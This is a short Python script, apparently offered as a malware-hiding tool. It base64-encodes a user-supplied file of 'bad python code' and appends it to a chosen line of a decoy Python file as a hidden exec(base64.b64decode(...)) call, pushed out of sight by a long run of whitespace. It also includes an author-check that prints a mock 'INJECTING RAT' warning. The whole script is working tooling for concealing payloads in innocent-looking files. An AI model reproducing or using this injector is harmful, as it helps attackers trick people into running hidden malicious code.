import os
import time
__author__ = "K.Dot#0001"
def main():
    import base64
    text = ""
    bad_file = input("Enter the path of the bad python code you want to encode: ")
    with open(bad_file, "r", encoding="utf8", errors="ignore") as f:
        lines_list = f.readlines()
        for lines in lines_list:
            text += lines
        text = text.encode()
        enc_txt =  base64.b64encode(text)

    input2 = input("what is the decoy file location? ")
    part = input("What what line would you like to start the bad code? ")

    with open(input2, 'r', encoding="utf8", errors="ignore") as file:
        data = file.readlines()

    codes = f";                                                                                                                                                                                                                                      import base64; exec(base64.b64decode({enc_txt}))\n"
    try: 
        data[int(part)-1] = data[int(part)-1].strip() + codes
    except:
        print("Error: Line number is out of range")

    with open('obfuscated.py', 'w', encoding="utf8", errors="ignore") as file:
        file.writelines( data )

if __author__ != '\x4b\x2e\x44\x6f\x74\x23\x30\x30\x30\x31':
    print('INJECTING RAT INTO YOUR SYSTEM')
    time.sleep(5)
    os._exit(0)

if __name__ == '__main__':
    main()